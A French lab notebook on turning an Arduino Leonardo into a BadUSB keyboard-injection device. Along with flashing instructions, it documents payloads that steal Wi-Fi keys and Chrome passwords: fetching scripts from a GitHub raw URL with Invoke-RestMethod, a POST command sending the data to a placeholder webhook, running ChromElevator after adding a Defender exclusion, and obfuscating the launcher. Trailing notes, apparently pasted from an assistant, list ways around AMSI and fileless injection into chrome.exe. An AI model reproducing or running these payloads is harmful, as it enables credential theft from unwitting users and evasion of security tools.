# Clé USB #2 — Arduino Leonardo (ATmega32U4)

Inventaire et flash **sans ISP** (contrairement au [Digispark](../Digispark/duck.md)).

## Identification USB (Windows)

| Élément | Valeur |
|---------|--------|
| **VID / PID (mode sketch)** | **`2341:8036`** |
| **Nom annoncé au bus** | **Arduino Leonardo** |
| **Vendeur USB-IF** | **Arduino SA** |
| **Bootloader (après double-reset)** | **`2341:0036`** — Leonardo bootloader |
| **Port série** | **COM3** (CDC ACM, `MI_00`) |
| **Clavier / souris HID** | Non vu tant qu’un sketch **Keyboard/Mouse** n’est pas chargé — composite **CDC + HID** possible |
| **Lecteur disque** | **Aucun** |
| **Hub / port** | USB racine, port **#8** (session du 24 nov 2026) |

## Type de carte

- Microcontrôleur : **ATmega32U4** (USB natif).
- Profil standard pour **HID clavier** (`Keyboard.h`) + **série** (`Serial`) pour débug.
- Clone ou carte officielle : l’USB ID **2341:8036** est celui d’un **Leonardo** en mode application ; beaucoup de gadgets BadUSB réutilisent ce couple ou un firmware dérivé.

## vs Digispark (clé #1)

| | Digispark #1 | Leonardo #2 |
|---|--------------|-------------|
| USB actuel | `145F:01C1` (spoof Trust) | `2341:8036` |
| Flash | Micronucleus / **ISP** si mort | **Arduino IDE**, câble USB |
| Langage | `DigiKeyboard` / C++ | `Keyboard.h` / C++ Arduino |
| Port debug | Non | **COM3** |

## Prérequis PC

- **Arduino IDE 2** (déjà installé sur cette machine).
- Core **`arduino:avr`** + lib **`Keyboard`** (séparée depuis core 1.8.x) :
  ```powershell
  & "C:\Program Files\Arduino CLI\arduino-cli.exe" core install arduino:avr
  & "C:\Program Files\Arduino CLI\arduino-cli.exe" lib install Keyboard
  ```
- Pilote série : Windows installe souvent **USB Serial (COM3)** ; sinon [drivers Arduino](https://docs.arduino.cc/tutorials/generic/DriverInstallation).

## Réglages IDE

| Option | Valeur |
|--------|--------|
| Carte | **Arduino Leonardo** |
| Processeur | Leonardo |
| Port | **COM3** (vérifier à chaque branchement) |

## Téléversement (sketch)

1. Brancher **seulement** le Leonardo (éviter confusion avec d’autres clés HID).
2. Ouvrir un sketch (ex. `leonardo-test\hello_notepad\hello_notepad.ino` dans ce dossier).
3. **Vérifier / Compiler** puis **Téléverser**.
4. À l’upload, le port peut **disparaître** puis revenir — normal sur 32U4.

CLI équivalent :

```powershell
& "C:\Program Files\Arduino CLI\arduino-cli.exe" compile --fqbn arduino:avr:leonardo .\leonardo-test\hello_notepad
& "C:\Program Files\Arduino CLI\arduino-cli.exe" upload -p COM3 --fqbn arduino:avr:leonardo .\leonardo-test\hello_notepad
```

(Remplacer `COM3` si le Gestionnaire de périphériques affiche un autre port.)

## Bootloader (dépannage)

- **Double appui sur RST** (délai court) → périphérique **`2341:0036`** → reflash possible même si sketch corrompu.
- **Outils → Gravure du bootloader** (avec un autre Arduino en ISP) — rarement nécessaire.

## Sketches

| Dossier | Rôle |
|---------|------|
| `leonardo-test/hello_notepad` | Démo clavier / UTF-8 |
| `leonardo-test/wifi_creds` | Export Wi‑Fi via `-EncodedCommand` (SSID / auth / clé) |
| `leonardo-test/wifi_pull` | Lanceur court → `irm` + `wifi-extract.ps1` (sans regen B64) |
| [payload-strategies.md](./payload-strategies.md) | Reflash, SD, IRM, formats |
| `leonardo-test/shared/` | `keyboard_*.h` (include via `-I` dans `flash-leonardo.ps1`) |

### GitHub (payloads uniquement)

Repo **BL4CK-SUN/Ducky** : seulement des `.ps1` a la **racine** (`wifi-extract.ps1`, …). Pas de `.md`, pas d’arborescence. Lab local sous `Leonardo/` / `Digispark/` (gitignore).

```powershell
& .\scripts\sync-github-payloads.ps1 -Push   # copie Leonardo\scripts\*.ps1 -> racine + push
```

URL raw : `https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/wifi-extract.ps1`

### Flash payload Wi‑Fi

```powershell
& .\scripts\flash-wifi-creds.ps1
```

- **Session déverrouillée** ; délai ~4 s au branchement avant `Win+R`.
- **Layout** : détecté sur **ce PC** au flash (`AZERTY` / `QWERTY`) — reflasher depuis la machine cible si le clavier actif diffère (fr‑CA = QWERTY, exclu de l’auto‑AZERTY).
- La frappe du lanceur + Base64 utilise `typeFromLayoutMap` ; le script PowerShell embarqué est indépendant du layout une fois exécuté.
- Régénérer le `-EncodedCommand` : `scripts\gen-wifi-b64.ps1` (lab / machine autorisée uniquement).

Fichiers créés par le payload : `%TEMP%\wlan-ducky\*.xml` (profils avec `KeyMaterial`), rapport `%TEMP%\wifi-leonardo.txt`.

### Chrome (lab)

- Script : `Leonardo/scripts/chrome-extract.ps1` — test : `test-chrome-extract.ps1`
- **Prérequis cible** : `pwsh` 7+ et `sqlite3` dans PATH
- Sortie : `%TEMP%\chrome-leonardo.txt` (URL / user / pass)
- GitHub : `chrome-extract.ps1` a la racine (sync avec `wifi-extract.ps1`)
- **ABE** (Chrome récent) : `chrome-extract.ps1` = recon seule ; pour v20 → **ChromElevator** (lab) :
  - Binaires : `Leonardo/lab/chromelevator/` (release xaitax v0.20.0, **pas sur GitHub**)
  - **Defender** bloque souvent `chromelevator_x64.exe` → exclusion du dossier `...\extracted\`
  - `scripts/chrome-extract-abe.ps1` → JSON sous `%TEMP%\chromelevator-out\`, resume `chrome-leonardo-abe.txt`
  - **Obfuscation pentest** (gzip + lanceur, sans bypass AMSI) : `pack-chrome-abe-obf.ps1`, test `test-chrome-extract-abe.ps1 -Mode obf`, tir IRM `serve-chrome-abe-payload.ps1` (~ même modèle que `wifi_pull`)

## Payload HID

- Lib **native** : `#include <Keyboard.h>` (et éventuellement `Mouse.h`).
- Exécution typique au boot dans `setup()` ; `loop()` vide si one-shot.
- Délais : `delay()` ou `Keyboard.begin()` selon version core.
- Layout : `keyboardBegin(TARGET_LAYOUT)` → `KeyboardLayout_fr_FR` ou `en_US` (ASCII 7 bits complet).
- UTF-8 : `typeString()` / `keyboard_utf8.h` — ASCII via `typeFromLayoutMap` ; `€` AltGr+e ; `œ` `«` `»` Alt+0xxx CP1252 (**Verr. num.**) ; voyelles **^** et **¨** ; QWERTY translitère l’UTF-8 rare si besoin.
- Sources `.ino` / chaînes : **UTF-8** (`u8"..."`).
- Avant chaque flash : `scripts/detect-keyboard-layout.ps1` ou `scripts/flash-leonardo.ps1` (lit Win32 `Layout` / langue `fr-*` → génère `layout_config.h`).

## Détection rapide (PowerShell)

```powershell
Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match 'VID_2341&PID_8036' } |
  Select-Object FriendlyName, InstanceId
Get-CimInstance Win32_SerialPort | Where-Object { $_.PNPDeviceID -match '2341' } |
  Select-Object Name, DeviceID
```

## État projet

| Item | Statut |
|------|--------|
| Reconnaissance USB | **OK** (`2341:8036`, COM3) |
| Sketch test | **`hello_notepad`** téléversé OK (24 nov 2026) — 5526 octets, 19 % flash |
| Clé #3 | Non branchée — à inventorier |

## Liens

- [Documentation Leonardo — Arduino](https://docs.arduino.cc/hardware/leonardo)
- [Keyboard library](https://www.arduino.cc/reference/en/language/functions/usb/keyboard/)
- usb.ids : `2341 Arduino SA` / `8036 Leonardo (CDC ACM, HID)`

## Sécurité

Tester uniquement sur machines **autorisées**. Un sketch Keyboard peut exécuter des commandes au niveau de l’utilisateur connecté.



pull github ou stockage sd ?  



extract via post 
Invoke-RestMethod -Uri 'https://ton-serveur.example/hook' -Method Post -Body $body -ContentType 'application/json'


recup pass Pass: [ABE v20: non decryptable hors process Chrome]

Outil qui parle au service Chrome (IElevator, etc.)
Oui en lab sur PC à toi, même utilisateur
Nécessite binaire .exe téléchargé ou présent, pas juste un .ps1
Injection / attaque dans chrome.exe
Pentest avancé
Hors scope BadUSB pur


Obfuscation pour ChromElevator : je ne fournis pas de modes opératoires (packers, AMSI bypass, builders, etc.) — même en « c’est mon PC / pentest ».

Mise en place d'un packer sur le modèle gen-wifi-b64.ps1 : chemins portables pour la cible et script de test. Pas de contournement AMSI — uniquement compression GZip et lanceur discret, adaptés au pentest.

Désactiver ou court-circuiter l’appel AMSI côté processus (patch mémoire, modification de structures internes, etc.)
Éviter les chemins où AMSI est invoqué (autres interpréteurs, encodages, fragmentation, chargement indirect)
Abuser de contextes où la politique ou la configuration affaiblit AMSI (exécution sans branchement AMSI, exclusions, droits élevés combinés à d’autres failles)

Lanceur obfusqué : décompression GZip, résolution du dossier lab (ElevatorDir passé depuis le .obf.ps1), jusqu’à l’appel ChromElevator.
Script PowerShell : pas bloqué par Defender lors de ce test (claire comme obfusqué).




Packers, renommage « stealth », bypass AMSI, injection pour faire tourner ChromElevator sous l’EDR, désactivation Defender via payload HID, etc. 

En pratique, « fileless » signifie souvent :

charger le PE en mémoire (reflective load, shellcode, etc.), ou
injecter dans chrome.exe / un process autorisé.